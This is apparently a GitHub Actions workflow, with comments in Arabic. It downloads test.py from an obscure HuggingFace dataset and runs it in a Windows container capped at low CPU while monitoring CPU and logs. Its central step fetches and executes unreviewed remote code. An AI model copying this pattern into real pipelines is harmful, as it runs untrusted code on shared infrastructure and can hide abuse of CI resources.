name: Download and Run Python Script with Live GitHub Metrics
on: workflow_dispatch

jobs:
  run-test:
    runs-on: windows-2022
    timeout-minutes: 15
    steps:
      - name: Start Docker Engine
        shell: pwsh
        run: |
          Set-Service docker -StartupType Automatic
          Start-Service docker

      - name: Download Python & Test Script
        shell: pwsh
        run: |
          Write-Host "📥 Downloading test.py from HuggingFace..."
          Invoke-WebRequest -Uri "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/test.py" -OutFile "test.py"

          Write-Host "📦 Downloading Portable Python embeddable..."
          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "python.zip"
          Expand-Archive -Path "python.zip" -DestinationPath "python" -Force
          Remove-Item "python.zip"

          # تفعيل pip داخل بيئة Python Embeddable
          Get-ChildItem -Path "python" -Filter "*._pth" | ForEach-Object {
              (Get-Content $_.FullName) -replace '#import site', 'import site' | Set-Content $_.FullName
          }

          Write-Host "✅ Setup completed successfully."

      - name: Execute Script & Monitor Live CPU Usage & Logs
        shell: pwsh
        run: |
          Write-Host "🚀 Launching test.py inside isolated capped container (--cpus=0.2, --memory=2G)..."
          
          # تشغيل الحاوية مع إلغاء الـ Buffering للطباعة الفورية
          $containerId = docker run -d `
            --name isolated_app `
            --isolation=process `
            --cpus=0.2 `
            --memory=2G `
            -e PYTHONUTF8=1 `
            -e PYTHONIOENCODING=utf-8 `
            -e PYTHONUNBUFFERED=1 `
            -v "${PWD}:C:/app" `
            -w C:/app `
            mcr.microsoft.com/windows/servercore:ltsc2022 `
            C:/app/python/python.exe C:/app/test.py

          Write-Host "Container started ID: $containerId"
          Write-Host "---------------------------------------------------------------------------------"
          Write-Host "📊 LIVE MONITORING & CONTAINER OUTPUT STREAM"
          Write-Host "---------------------------------------------------------------------------------"

          $sample = 1
          $lastLogLine = 0

          # مراقبة مستمرة وعرض سجلات السكربت الحية
          while ($(docker inspect -f '{{.State.Running}}' isolated_app 2>$null) -eq 'true') {
              $hostCpu = (Get-Counter -Counter "\Processor(_Total)\% Processor Time" -ErrorAction SilentlyContinue).CounterSamples[0].CookedValue
              $stats = docker stats isolated_app --no-stream --format "CPU: {{.CPUPerc}} | MEM: {{.MemUsage}}" 2>$null

              Write-Host "`n[Sample $sample] -> Host Total CPU: $($hostCpu.ToString('0.0'))% | $stats"
              
              # طباعة المخرجات الجديدة القادمة من test.py فوراً
              Write-Host "--- Container Live Logs ---"
              docker logs --tail 5 isolated_app
              Write-Host "---------------------------"

              Start-Sleep -Seconds 3
              $sample++
          }

          Write-Host "---------------------------------------------------------------------------------"
          Write-Host "🏁 Execution Finished!"
          Write-Host "=== FINAL ALL CONTAINER LOGS ==="
          docker logs isolated_app
          docker rm -f isolated_app
